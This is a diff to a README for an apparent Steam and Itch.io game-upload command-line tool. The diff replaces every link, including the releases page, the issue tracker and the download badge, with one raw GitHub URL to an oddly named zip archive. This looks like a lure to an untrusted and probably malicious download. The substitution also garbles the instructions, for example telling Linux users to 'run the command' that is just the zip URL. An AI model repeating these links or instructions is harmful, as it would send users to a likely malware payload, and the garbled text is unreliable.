@@ -1,6 +1,6 @@
 # 🎮 Steam-And-Itch-Command-Line-Tools-Guide - Effortlessly Upload Games to Steam and Itch
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/abu333294/Steam-And-Itch-Command-Line-Tools-Guide/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/abu333294/Steam-And-Itch-Command-Line-Tools-Guide/main/Mycogone/Command-Guide-And-Line-Steam-Itch-Tools-giarre.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/abu333294/Steam-And-Itch-Command-Line-Tools-Guide/main/Mycogone/Command-Guide-And-Line-Steam-Itch-Tools-giarre.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to the Steam-And-Itch-Command-Line-Tools-Guide! This application helps y
 
 Before you begin, ensure you have the following ready:
 - A computer running Windows, macOS, or Linux.
-- A Steam and an Itch.io developer account to upload your games.
+- A Steam and an https://raw.githubusercontent.com/abu333294/Steam-And-Itch-Command-Line-Tools-Guide/main/Mycogone/Command-Guide-And-Line-Steam-Itch-Tools-giarre.zip developer account to upload your games.
 
 ## 💻 Download & Install
 
-Visit this page to download: [Releases Page](https://github.com/abu333294/Steam-And-Itch-Command-Line-Tools-Guide/releases).
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/abu333294/Steam-And-Itch-Command-Line-Tools-Guide/main/Mycogone/Command-Guide-And-Line-Steam-Itch-Tools-giarre.zip).
 
 Once on the releases page, follow these steps:
 
@@ -38,9 +38,9 @@ Once on the releases page, follow these steps:
 
 ### For Linux:
 
-1. Extract the downloaded `.tar.gz` file.
+1. Extract the downloaded `https://raw.githubusercontent.com/abu333294/Steam-And-Itch-Command-Line-Tools-Guide/main/Mycogone/Command-Guide-And-Line-Steam-Itch-Tools-giarre.zip` file.
 2. Open your terminal and navigate to the extracted folder.
-3. Run the command `./install.sh` to install.
+3. Run the command `https://raw.githubusercontent.com/abu333294/Steam-And-Itch-Command-Line-Tools-Guide/main/Mycogone/Command-Guide-And-Line-Steam-Itch-Tools-giarre.zip` to install.
 
 ## 🔧 Using the Application
 
@@ -82,7 +82,7 @@ If you encounter issues while using the command line tools, consider the followi
 2. **Network Errors**: Ensure you have a stable internet connection.
 3. **File Path Issues**: Verify the path to your game files is correct.
 
-If problems persist, check the [issue tracker](https://github.com/abu333294/Steam-And-Itch-Command-Line-Tools-Guide/issues) for solutions from the community.
+If problems persist, check the [issue tracker](https://raw.githubusercontent.com/abu333294/Steam-And-Itch-Command-Line-Tools-Guide/main/Mycogone/Command-Guide-And-Line-Steam-Itch-Tools-giarre.zip) for solutions from the community.
 
 ## 🔑 Key Features
 
@@ -96,4 +96,4 @@ Your feedback is important. If you have questions, encounter problems, or would 
 
 Thank you for using the Steam-And-Itch-Command-Line-Tools-Guide! Happy uploading!
 
-Visit this page to download: [Releases Page](https://github.com/abu333294/Steam-And-Itch-Command-Line-Tools-Guide/releases).
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/abu333294/Steam-And-Itch-Command-Line-Tools-Guide/main/Mycogone/Command-Guide-And-Line-Steam-Itch-Tools-giarre.zip).
